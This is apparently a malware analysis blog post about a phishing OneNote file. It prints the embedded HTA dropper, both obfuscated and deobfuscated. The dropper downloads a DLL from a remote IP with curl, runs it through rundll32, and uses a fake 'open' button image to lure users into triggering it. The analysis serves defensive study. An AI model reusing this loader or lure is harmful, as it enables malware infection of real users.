---
title: "Malicious OneNote File"
classes: wide
header:
  teaser: /assets/images/mal-docs/Malicious_OneNote/ground.png
ribbon: DodgerBlue
description: "Investigation for Phishing OneNote File ..."
categories:
  - Mal-Docs
toc: true
---

# Sample info

We are given a Sample OneNote file with hash 
    
    sha256 "a870d31caea7f6925f41b581b98c35b162738034d5d86c0c27c5a8d78404e860"

I always like to Start my analysis using the two utilities "file & strings"
So running file utility returned that.

![error loading](/assets/images/mal-docs/Malicious_OneNote/file.png)

Not so intersting i know, but Strings output looks very intersting.

![error loading](/assets/images/mal-docs/Malicious_OneNote/strings.png)

The JavaScript code here doesn't have that much of obfuscation. 

```html
<html>
<div id="content">f5&u5&n5&c5&t5&i5&o5&n5& 5&s5&l5&e5&e5&p5&(5&m5&i5&l5&l5&i5&s5&)5&{5&v5&a5&r5& 5&d5&a5&t5&e5& 5&=5& 5&n5&e5&w5& 5&D5&a5&t5&e5&(5&)5&;5&v5&a5&r5& 5&c5&u5&r5&D5&a5&t5&e5& 5&=5& 5&n5&u5&l5&l5&;5&d5&o5& 5&{5& 5&c5&u5&r5&D5&a5&t5&e5& 5&=5& 5&n5&e5&w5& 5&D5&a5&t5&e5&(5&)5&;5& 5&}5&w5&h5&i5&l5&e5&(5&c5&u5&r5&D5&a5&t5&e5& 5&-5& 5&d5&a5&t5&e5& 5&<5& 5&m5&i5&l5&l5&i5&s5&)5&;5&}5&/5&*5&*5& 5&v5&a5&r5& 5&u5&r5&l5& 5&=5& 5&"5&h5&t5&t5&p5&s5&:5&/5&/5&g5&o5&o5&g5&l5&e5&.5&c5&o5&m5&"5&;5& 5&*5&/5&n5&e5&w5& 5&A5&c5&t5&i5&v5&e5&X5&O5&b5&j5&e5&c5&t5&(5&"5&w5&s5&c5&r5&i5&p5&t5&.5&s5&h5&e5&l5&l5&"5&)5&.5&r5&u5&n5&(5&"5&c5&u5&r5&l5&.5&e5&x5&e5& 5&-5&-5&o5&u5&t5&p5&u5&t5& 5&C5&:5&\5&\5&P5&r5&o5&g5&r5&a5&m5&D5&a5&t5&a5&\5&\5&i5&n5&d5&e5&x5&15&.5&p5&n5&g5& 5&-5&-5&u5&r5&l5& 5&"5& 5&+5& 5&u5&r5&l5&,5& 5&05&)5&;5&s5&l5&e5&e5&p5&(5&15&55&05&05&05&)5&;5&v5&a5&r5& 5&s5&h5&e5&l5&l5& 5&=5& 5&n5&e5&w5& 5&A5&c5&t5&i5&v5&e5&X5&O5&b5&j5&e5&c5&t5&(5&"5&s5&h5&e5&l5&l5&.5&a5&p5&p5&l5&i5&c5&a5&t5&i5&o5&n5&"5&)5&;5&s5&h5&e5&l5&l5&.5&s5&h5&e5&l5&l5&e5&x5&e5&c5&u5&t5&e5&(5&"5&r5&u5&n5&d5&l5&l5&35&25&"5&,5& 5&"5&C5&:5&\5&\5&P5&r5&o5&g5&r5&a5&m5&D5&a5&t5&a5&\5&\5&i5&n5&d5&e5&x5&15&.5&p5&n5&g5&,5&W5&i5&n5&d5&"5&,5& 5&"5&"5&,5& 5&"5&o5&p5&e5&n5&"5&,5& 5&35&)5&;5&</div>
<script language="javascript">
var h3 = "800de15c79c8d840f4e78d3af937d4d4";
var content = document.getElementById("content").innerText;
</script>
<script language="vbscript">
Dim WshShell : Set WshShell = CreateObject("WScript.Shell")
' Write reg
WshShell.RegWrite "HKCU\SOFTWARE\Xeonitox\MP3Conv\Cfg", content, "REG_SZ"
' msgbox WshShell.RegRead("HKCU\SOFTWARE\Xeonitox\MP3Conv\Cfg")
</script>
<script language="javascript">
var body = WshShell.RegRead("HKCU\\SOFTWARE\\Xeonitox\\MP3Conv\\Cfg");
var func = Function("url", body.replace(/5&/g, ""));
func("http://139.99.117.17/39444.dat");
</script>
<script language="vbscript">
WshShell.RegDelete("HKCU\SOFTWARE\Xeonitox\MP3Conv\Cfg")
' Close window
window.close
</script>
</html>
```

It's just a simple replacement for the "5&" with nothing.
here is the deobfuscated code.

```js
function sleep(millis){
  var date = new Date();
  var curDate = null;
  do { 
    curDate = new Date();
     }
     while(curDate - date < millis);
   }/** var url = "https://google.com"; */
   new ActiveXObject("wscript.shell").run("curl.exe --output C:\\ProgramData\\index1.png --url " + url, 0);
   sleep(15000);
   var shell = new ActiveXObject("shell.application");shell.shellexecute("rundll32", "C:\\ProgramData\\index1.png,Wind", "", "open", 3);
```
The Script is prety easy it's just downloading a file from a remoteserver and executing it using "rundll32" So it's downloading a dll file and passing the parameter "wind" to the rundll32 to specify the function that will be executed in that dll.

# Tricking method

The most popular way for tricking user to trigger the payload in OneNote can be shown in the following picture.

![error loading](/assets/images/mal-docs/Malicious_OneNote/ground.png)

This is the what you will see if you opened the note, as you can imagine the only thing you can do is clicking the open button.
But actually it's not a button, it's a small picture that alligned above an HTA file which is the script we saw before.
So clicking the open button is actually triggering the HTA file.

![error loading](/assets/images/mal-docs/Malicious_OneNote/ground2.png)

